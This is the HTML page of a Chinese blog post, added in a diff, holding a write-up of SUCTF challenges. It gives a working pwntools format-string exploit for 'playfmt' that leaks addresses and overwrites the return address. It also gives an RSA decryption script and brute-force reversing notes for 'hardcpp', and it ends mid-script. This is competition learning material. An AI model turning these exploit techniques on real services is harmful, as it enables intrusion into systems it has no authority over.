@@ -1,0 +1,535 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SUCTF二进制部分wp - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="前言这场比赛打了2天，学到了东西，在这里做下总结，方便后续学习。一、Pwn方向1、playfmt这次的pwn题很不友好，只有这题能做，菜鸡Orz，先检查保护机制:
+
+got表不可改，堆栈不可执行，看,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">SUCTF二进制部分wp</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/ctf比赛"><b>「
+                    </b>CTF比赛<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/SUCTF%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%83%A8%E5%88%86wp/" title="SUCTF二进制部分wp" class="">SUCTF二进制部分wp</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    28k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    25 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/re/" rel="tag">re</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h5 id="这场比赛打了2天，学到了东西，在这里做下总结，方便后续学习。"><a href="#这场比赛打了2天，学到了东西，在这里做下总结，方便后续学习。" class="headerlink" title="这场比赛打了2天，学到了东西，在这里做下总结，方便后续学习。"></a>这场比赛打了2天，学到了东西，在这里做下总结，方便后续学习。</h5><h3 id="一、Pwn方向"><a href="#一、Pwn方向" class="headerlink" title="一、Pwn方向"></a>一、Pwn方向</h3><h5 id="1、playfmt"><a href="#1、playfmt" class="headerlink" title="1、playfmt"></a>1、playfmt</h5><p>这次的pwn题很不友好，只有这题能做，菜鸡Orz，先检查保护机制:</p>
+<p><img src="/blog_img/1566313002289.png" alt="1566313002289"></p>
+<p>got表不可改，堆栈不可执行，看名字知道是格式化字符串漏洞的题目~ida分析一波：</p>
+<a id="more"></a>
+
+<p><img src="/blog_img/1566313270294.png" alt="1566313270294"></p>
+<p>可以看到申请了堆块去存放flag的内容，然后进去logo函数的do_fmt函数，里面有格式化字符串漏洞：</p>
+<p><img src="/blog_img/1566313050085.png" alt="1566313050085"></p>
+<p>漏洞点就是格式化字符串，这里能读入0xc8字节，而且是个死循环，除非你输入quit手动退出，很明显了，但是buf不是栈，是bss段地址，也就是格式化字符串写bss（lab9做过），写bss段，就是写指针，需要泄露出stack地址才能进行操作，所以利用思路就有了：</p>
+<p>由于本地没有flag文件，所以要自己先创建一个，内容随意~然后步骤：</p>
+<p>1、泄露出真实地址、栈地址、堆地址</p>
+<p>2、往ret位置写入onegadget去getshell，或者ret填printf的地址外加参数填flag的堆地址去打印出flag（比赛时一开始看到flag在堆上就想着打印，所以用了第二种方法）</p>
+<p>这里用双字节写入的方式，一步一步地构造好栈的布局，然后quit就直接搞定了~</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./playfmt'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./playfmt'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># f = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># f[0x8048260]=0x45372800</span></span><br><span class="line"><span class="comment"># f[0x8048260+4]=0x7f20</span></span><br><span class="line"><span class="comment"># f.payload(7)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">"-%6$p-%18$p-%23$p-"</span></span><br><span class="line"><span class="comment">#bk(0x080488A4)</span></span><br><span class="line">ru(<span class="string">"====================="</span>)</span><br><span class="line">sl(py)</span><br><span class="line">ru(<span class="string">"-"</span>)</span><br><span class="line">ret_stack = int(ru(<span class="string">"-"</span>)[:<span class="number">-1</span>],<span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"ret_stack---&gt;"</span> + hex(ret_stack)</span><br><span class="line">flag_heap = int(ru(<span class="string">"-"</span>)[:<span class="number">-1</span>],<span class="number">16</span>) - <span class="number">0x18</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag_heap---&gt;"</span> + hex(flag_heap)</span><br><span class="line">main_addr = int(ru(<span class="string">"-"</span>)[:<span class="number">-1</span>],<span class="number">16</span>) - <span class="number">247</span></span><br><span class="line">libc_base = main_addr - libc.symbols[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0x5fbc5</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"main_addr---&gt;"</span> + hex(main_addr)</span><br><span class="line">printf_addr = libc_base + libc.symbols[<span class="string">"printf"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf---&gt;"</span> + hex(printf_addr) </span><br><span class="line"></span><br><span class="line"><span class="comment"># py = "%" + str(ret_stack&amp;0xffff) + "c%6$hn-"</span></span><br><span class="line"><span class="comment"># py = py.ljust(0xc8,"\x00")</span></span><br><span class="line"><span class="comment"># sd(py)</span></span><br><span class="line"><span class="comment"># py = "%" + str(onegadget&amp;0xffff) + "c%14$hn-"</span></span><br><span class="line"><span class="comment"># py = py.ljust(0xc8,"\x00")</span></span><br><span class="line"><span class="comment"># ru('-')</span></span><br><span class="line"><span class="comment"># sd(py)</span></span><br><span class="line"><span class="comment"># py = "%" + str((ret_stack+0x2)&amp;0xffff) + "c%6$hn-"</span></span><br><span class="line"><span class="comment"># py = py.ljust(0xc8,"\x00")</span></span><br><span class="line"><span class="comment"># ru('-')</span></span><br><span class="line"><span class="comment"># sd(py)</span></span><br><span class="line"><span class="comment"># py = "%" + str((onegadget&amp;0xffff0000)&gt;&gt;16) + "c%14$hn-"</span></span><br><span class="line"><span class="comment"># py = py.ljust(0xc8,"\x00")</span></span><br><span class="line"><span class="comment"># ru('-')</span></span><br><span class="line"><span class="comment"># sd(py)</span></span><br><span class="line"></span><br><span class="line">py = <span class="string">"%"</span> + str(ret_stack&amp;<span class="number">0xffff</span>) + <span class="string">"c%6$hn-"</span></span><br><span class="line">py = py.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">sd(py)</span><br><span class="line">py = <span class="string">"%"</span> + str(printf_addr&amp;<span class="number">0xffff</span>) + <span class="string">"c%14$hn-"</span></span><br><span class="line">py = py.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">ru(<span class="string">'-'</span>)</span><br><span class="line">sd(py)</span><br><span class="line">py = <span class="string">"%"</span> + str((ret_stack+<span class="number">0x2</span>)&amp;<span class="number">0xffff</span>) + <span class="string">"c%6$hn-"</span></span><br><span class="line">py = py.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">ru(<span class="string">'-'</span>)</span><br><span class="line">sd(py)</span><br><span class="line">py = <span class="string">"%"</span> + str((printf_addr&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span>) + <span class="string">"c%14$hn-"</span></span><br><span class="line">py = py.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">ru(<span class="string">'-'</span>)</span><br><span class="line">sd(py)</span><br><span class="line"></span><br><span class="line">py = <span class="string">"%"</span> + str((ret_stack+<span class="number">0x8</span>)&amp;<span class="number">0xffff</span>) + <span class="string">"c%6$hn-"</span></span><br><span class="line">py = py.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">ru(<span class="string">'-'</span>)</span><br><span class="line">sd(py)</span><br><span class="line">py = <span class="string">"%"</span> + str((flag_heap)&amp;<span class="number">0xffff</span>) + <span class="string">"c%14$hn-"</span></span><br><span class="line">py = py.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">ru(<span class="string">'-'</span>)</span><br><span class="line">sd(py)</span><br><span class="line">py = <span class="string">"%"</span> + str((ret_stack+<span class="number">0xa</span>)&amp;<span class="number">0xffff</span>) + <span class="string">"c%6$hn-"</span></span><br><span class="line">py = py.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">ru(<span class="string">'-'</span>)</span><br><span class="line">sd(py)</span><br><span class="line">py = <span class="string">"%"</span> + str((flag_heap&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span>) + <span class="string">"c%14$hn-"</span> </span><br><span class="line">py = py.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">ru(<span class="string">'-'</span>)</span><br><span class="line">sd(py)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'-'</span>)</span><br><span class="line">sl(<span class="string">"quit"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里我利用了一个小技巧，就是“-”作为接受符号，这样写入完成后才继续下一个，保证写入时正确写完，接受地址时也很方便~但是这题坑点就是远程一开始打不通，因为libc版本不对，是libc.2.23.so，要自己去一个个查（扎铁了，老心），下面是调试图：</p>
+<p><img src="/blog_img/1566314493278.png" alt="1566314493278"></p>
+<p><img src="/blog_img/1566314536748.png" alt="1566314536748"></p>
+<p><img src="/blog_img/1566314589525.png" alt="1566314589525"></p>
+<h3 id="二、Re"><a href="#二、Re" class="headerlink" title="二、Re"></a>二、Re</h3><p>1、signin</p>
+<p><img src="/blog_img/1566314755453.png" alt="1566314755453"></p>
+<p>这题一看很大的数字，然后输入就是flag，关键函数是powm函数，去查了下这个函数是干嘛的，发现实现的操作就是RSA的加密过程，v6的v5次方对v4求余写入v6，cmp一下v6和v7，除了v6，其他值都是知道的，那么写一下公式：</p>
+<p>v6^65537 mod (103461035……)=(0xad939ff9….)</p>
+<p>一看这不就是RSA吗？还是最简单的那种，直接分解n然后解密得到明文v6就是flag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">c = <span class="number">78510953323073667749065685964447569045476327122134491251061064910992472210485</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">computeD</span><span class="params">(fn, e)</span>:</span></span><br><span class="line">    (x, y, r) = extendedGCD(fn, e)</span><br><span class="line">    <span class="comment">#y maybe &lt; 0, so convert it</span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> fn + y</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extendedGCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="comment">#a*xi + b*yi = ri</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    <span class="comment">#a*x1 + b*y1 = a</span></span><br><span class="line">    x1 = <span class="number">1</span></span><br><span class="line">    y1 = <span class="number">0</span></span><br><span class="line">    <span class="comment">#a*x2 + b*y2 = b</span></span><br><span class="line">    x2 = <span class="number">0</span></span><br><span class="line">    y2 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        q = a / b</span><br><span class="line">        <span class="comment">#ri = r(i-2) % r(i-1)</span></span><br><span class="line">        r = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = r</span><br><span class="line">        <span class="comment">#xi = x(i-2) - q*x(i-1)</span></span><br><span class="line">        x = x1 - q*x2</span><br><span class="line">        x1 = x2</span><br><span class="line">        x2 = x</span><br><span class="line">        <span class="comment">#yi = y(i-2) - q*y(i-1)</span></span><br><span class="line">        y = y1 - q*y2</span><br><span class="line">        y1 = y2</span><br><span class="line">        y2 = y</span><br><span class="line">    <span class="keyword">return</span>(x1, y1, a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getm</span><span class="params">(p,q,e,c)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    fn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = computeD(fn, e)</span><br><span class="line">    m=hex(pow(c,d,n))</span><br><span class="line">    m = str(m).replace(<span class="string">'0x'</span>,<span class="string">''</span>).replace(<span class="string">'L'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> m.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> getm(p,q,e,c)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1566315186946.png" alt="1566315186946"></p>
+<p>2、hardcpp</p>
+<p>这题有点东西，踩了一个下午坑才搞出来，ida分析一波：说句实话，此题几乎是动态调试出来的，静态我搞不定~~</p>
+<p><img src="/blog_img/1566315269115.png" alt="1566315269115"></p>
+<p>发现了一串16进制的数字，然后转了字符也没东西，直到最后解出来我都不知道这个有什么用，就跳过了。。。看到fget输入21size的字符串，然后设置了time(0)，这里v38和v49就是时间差，这题的逻辑分析，静态一下你会发现很恶心，很多while：</p>
+<p><img src="/blog_img/1566315455036.png" alt="1566315455036"></p>
+<p>差点想关ida，然而想了下，还是忍忍吧，逆向需要耐心，终于来到了最里层</p>
+<p><img src="/blog_img/1566315492692.png" alt="1566315492692"></p>
+<p>由于是用C++写的加密算法，所以我根据功能重命名了下，好看些，写着jiami的都是没看懂它在干嘛的(静态真的分析不懂，菜是原罪)，然后动态调试跟汇编调出来每一个加密都在干嘛，就把注释也写上去了，下面具体讲下我的注释都是怎么调出来的：</p>
+<p>首先要运行需要装个libc++的库（C++语言写的程序依赖库）：</p>
+<p>装库命令：sudo apt-get install libc++-dev（谷歌能解决的问题最好别问为什么~）</p>
+<p>下面是动态调试：</p>
+<p>先输入我们的21位字符，为了方便看我顺序输入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sl(<span class="string">'abcdefghijklmnopqrstu'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>1、判断能进去while循环里层的条件：</p>
+<p><img src="/blog_img/1566315940037.png" alt="1566315940037"></p>
+<p>断点下在计算时间差那里，通过修改时间差为0才能进入while最里层（为什么？因为经过不断调试才发现后面的跳转条件需要满足为：时间差为0，搞这个就花了很多时间。。。）</p>
+<p>命令：set $rsi=0，然后在主逻辑0x400dd3处断下来</p>
+<p><img src="/blog_img/1566316077002.png" alt="1566316077002"></p>
+<p><img src="/blog_img/1566316651803.png" alt="1566316651803"></p>
+<p>下面开始跟汇编看第一个算法xor：</p>
+<p><img src="/blog_img/1566316809858.png" alt="1566316809858"></p>
+<p>可以知道rcx(input[idx])是我们输入的第二个字符，所以，idx=1，同时rdx为0(v38)，我们知道A^0=A,所以得到第一步加密结果，注释为：// idx=1，从1开始，v35=input[idx]</p>
+<p>这里需要记住打逆向的一个小技巧，函数的返回值都是放在rax（eax）寄存器的，那么这个寄存器放的就是加密后的结果，copy那个静态都能看出来，就不分析了，mod也是，xor和cheng也一样，顾名思义的东西，重点看下jiami算法：</p>
+<p><img src="/blog_img/1566317328914.png" alt="1566317328914"></p>
+<p>又是一堆很长的加密，没看懂，不会，动态调试看返回值~</p>
+<p>第二个算法：jiami1</p>
+<p><img src="/blog_img/1566317713662.png" alt="1566317713662"></p>
+<p>一步步跟汇编，这里要知道pwn的一些知识，函数调用前，因为64位的，所以前2个参数放在rdi和rsi寄存器中，函数返回值放在rax中，看下jiami1：</p>
+<p><img src="/blog_img/1566317900186.png" alt="1566317900186"></p>
+<p>上一个函数mod的返回值是0x6，rdi放0x62(input[1])，rsi等于mod的结果，ni一下：</p>
+<p><img src="/blog_img/1566317995867.png" alt="1566317995867"></p>
+<p>发现变成了0x68，貌似0x62+0x6=0x68？（一开始也是猜，先写了再说~）</p>
+<p>因为后面还有jiami1算法的实现，最后调试时知道了原理：</p>
+<p>jiami1（a，b）—&gt;返回值为(a+b)&amp;0xff</p>
+<p>同理一步步调试可以知道jiami2原理：</p>
+<p>jiami2（a，b) —–&gt; 返回值为b</p>
+<p>jiami3（a，b）——&gt;返回值为b</p>
+<p>最后得到一开始的图：</p>
+<p><img src="/blog_img/1566318443168.png" alt="1566318443168"></p>
+<p>v15=(((input[idx-1]^18)*3+2)&amp;0xff)^(input[idx-1]%7+input[idx])</p>
+<p>v15就是最后的加密结果，发现它和enc数组有个cmp，提取出enc的内容，那么算法就逆向完了，很容易想到，input就是flag，现在我们需要逆向这个算法，简单分析下，就是input的01,12,23,34,45这样每两两进行加密得到一位密文，我自创命名它为堆叠移位加密，好了知道加密算法，但是直接逆比较复杂，想到爆破法！我们知道flag长这样：flag{xxxxxxxxx}</p>
+<p>所以可以写个深度搜索算法去自动找匹配，失败了返回上一层，成功了继续爆破，直到跑完就能得到flag，但是打比赛时没写出来深搜（数据结构没学好哎），用一种比较捞的方式出了flag，半自动化猜，就是知道前一个，可以爆破出后一个是什么，知道{就可以爆破出下一个……..或者翻过来，知道}可以往回推倒数第二个，推倒数第三个……</p>
+<p>这里用逆推法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#idx = 1</span></span><br><span class="line"><span class="comment">#v15=(((input[idx-1]^18)*3+2)&amp;0xff)^(input[idx-1]%7+input[idx])</span></span><br><span class="line"><span class="comment">#enc[idx-1]=v15</span></span><br><span class="line">enc = [<span class="number">0xF3</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xE1</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xD1</span>, <span class="number">0xF9</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xF4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xA3</span>, <span class="number">0x90</span>, <span class="number">0x0E</span>, <span class="number">0xA5</span>]</span><br><span class="line"><span class="comment">#v = "f"</span></span><br><span class="line"><span class="comment">#v = "l"</span></span><br><span class="line"><span class="comment">#v = "a"</span></span><br><span class="line"><span class="comment">#v = "g"</span></span><br><span class="line"><span class="comment">#v = "&#123;"</span></span><br><span class="line"><span class="comment">#v = "m"</span></span><br><span class="line"><span class="comment">#v = "Y"</span></span><br><span class="line"><span class="comment">#v = "-"</span></span><br><span class="line"><span class="comment">#v = "C"</span></span><br><span class="line"><span class="comment">#v = "u"</span></span><br><span class="line"><span class="comment">#v = "r"</span></span><br><span class="line"><span class="comment">#v = "R"</span></span><br><span class="line"><span class="comment">#v = "1"</span></span><br><span class="line"><span class="comment">#v = "e"</span></span><br><span class="line"><span class="comment">#v = "d"</span></span><br><span class="line"><span class="comment">#v = "_"</span></span><br><span class="line"><span class="comment">#v = "F"</span></span><br><span class="line"><span class="comment">#v = "n"</span></span><br><span class="line"><span class="comment">#v = "s"</span></span><br><span class="line">v = <span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line">k = len(enc)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">	code = (((i^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>)&amp;<span class="number">0xff</span>)^(i%<span class="number">7</span>+ord(v))</span><br><span class="line">	<span class="keyword">if</span> code==enc[k<span class="number">-1</span>]:</span><br><span class="line">	